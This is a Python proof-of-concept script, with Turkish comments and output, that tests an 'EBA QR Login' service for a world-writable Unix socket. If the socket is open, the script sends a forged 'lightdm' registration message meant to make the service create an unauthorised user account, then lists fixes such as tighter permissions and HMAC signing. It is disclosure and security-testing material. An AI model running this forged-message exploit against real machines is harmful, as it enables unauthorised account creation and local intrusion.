#!/usr/bin/env python3
"""
EBA QR Login Unix Socket Security Test (Proof of Concept)
Bu betik SADECE güvenlik testi ve eğitim amaçlıdır.
Kendi sisteminizde test edin, izinsiz kullanmayın!
"""

import socket
import json
import sys
import subprocess

SOCKET_PATH = "/run/etap/qr-trigger"

def check_socket_permissions():
    """Socket dosyasının izinlerini kontrol et"""
    try:
        import os
        import stat
        st = os.stat(SOCKET_PATH)
        mode = oct(st.st_mode)[-4:]
        print(f"[*] Socket izinleri: {mode}")
        
        if mode == "1777":
            print("[!] TEHLİKE: Socket 1777 izinlerine sahip (herkes yazabilir)")
            return True
        else:
            print("[+] Socket güvenli izinlere sahip")
            return False
    except FileNotFoundError:
        print(f"[!] Socket bulunamadı: {SOCKET_PATH}")
        return False
    except Exception as e:
        print(f"[!] Hata: {e}")
        return False

def test_unauthorized_access():
    """Yetkisiz erişim testi yap"""
    print("\n[*] Yetkisiz erişim testi başlatılıyor...")
    print("[*] Bu test sistemde sahte bir kullanıcı oluşturmayı dener")
    print("[*] UYARI: Bu sadece test amaçlıdır!\n")
    
    # Sahte validation mesajı
    fake_validation = {
        "sender": "lightdm",
        "action": "register",
        "type": "validation",
        "status": "success",
        "user_data": {
            "hasRole": "0",
            "isEmailVerify": "0",
            "isForeign": "0",
            "isGuardian": "0",
            "selectedSchool": {
                "boroughId": "1",
                "boroughName": "TEST",
                "cityId": "999",
                "cityName": "TEST",
                "schoolId": "999999",
                "schoolName": "Security Test"
            },
            "taskId": "0",
            "tckn": "99999999999",
            "uid": "test_security_user_12345",
            "uname": "Security Test User",
            "utype": "TESTUSER"
        }
    }
    
    try:
        # Unix socket'e bağlan
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(SOCKET_PATH)
        
        # Sahte mesajı gönder
        message = json.dumps(fake_validation)
        s.send(message.encode())
        
        print("[+] Sahte mesaj gönderildi!")
        print(f"[*] Mesaj içeriği:\n{json.dumps(fake_validation, indent=2)}")
        
        s.close()
        
        print("\n[*] Kullanıcı oluşturulup oluşturulmadığını kontrol edin:")
        print("    sudo cat /etc/passwd | grep securitytest")
        
        return True
        
    except FileNotFoundError:
        print("[!] Socket bulunamadı - servis çalışmıyor olabilir")
        return False
    except PermissionError:
        print("[+] İyi haber! İzin hatası - socket korumalı")
        return False
    except ConnectionRefusedError:
        print("[!] Bağlantı reddedildi - servis çalışmıyor")
        return False
    except Exception as e:
        print(f"[!] Hata: {e}")
        return False

def suggest_fixes():
    """Güvenlik düzeltmeleri öner"""
    print("\n" + "="*60)
    print("GÜVENLİK DÜZELTMELERİ")
    print("="*60)
    print("""
1. Socket İzinlerini Düzelt:
   unix_socket_service.py dosyasında:
   - DEĞİŞTİR: os.chmod(self.SOCKET_PATH, 0o1777)
   - YENİ:     os.chmod(self.SOCKET_PATH, 0o770)
   - Sadece root ve belirli grup yazabilsin

2. Authentication Ekle:
   - Mesajlara HMAC imzası ekle
   - Shared secret kullan
   - Sadece imzalı mesajları işle

3. Kullanıcı Adı Validasyonu:
   import re
   if not re.match(r'^[a-z][a-z0-9_-]{2,15}$', username):
       raise ValueError("Geçersiz kullanıcı adı")

4. Rate Limiting:
   - Her IP/socket için dakikada max 5 istek
   - Brute force saldırılarını önle

5. Audit Logging:
   - Tüm socket bağlantılarını logla
   - Kimlik doğrulama başarısız/başarılı olayları kaydet

6. SELinux/AppArmor:
   - Socket için mandatory access control
   - Sadece belirli process'lerin erişimini izin ver
""")

def main():
    print("="*60)
    print("EBA QR LOGIN - GÜVENLİK TESTİ (PoC)")
    print("="*60)
    print("UYARI: Bu araç SADECE kendi sistemlerinizde test için!")
    print("Yetkisiz kullanım yasa dışıdır.\n")
    
    response = input("Devam etmek istiyor musunuz? (evet/hayır): ")
    if response.lower() not in ['evet', 'e', 'yes', 'y']:
        print("Test iptal edildi.")
        return
    
    # 1. Socket izinlerini kontrol et
    vulnerable = check_socket_permissions()
    
    if vulnerable:
        print("\n[!] Sistem güvenlik açığına sahip!")
        response = input("\nTest etmeye devam edilsin mi? (evet/hayır): ")
        if response.lower() in ['evet', 'e', 'yes', 'y']:
            test_unauthorized_access()
    
    # Düzeltme önerileri
    suggest_fixes()
    
    print("\n[*] Test tamamlandı.")

if __name__ == "__main__":
    main()
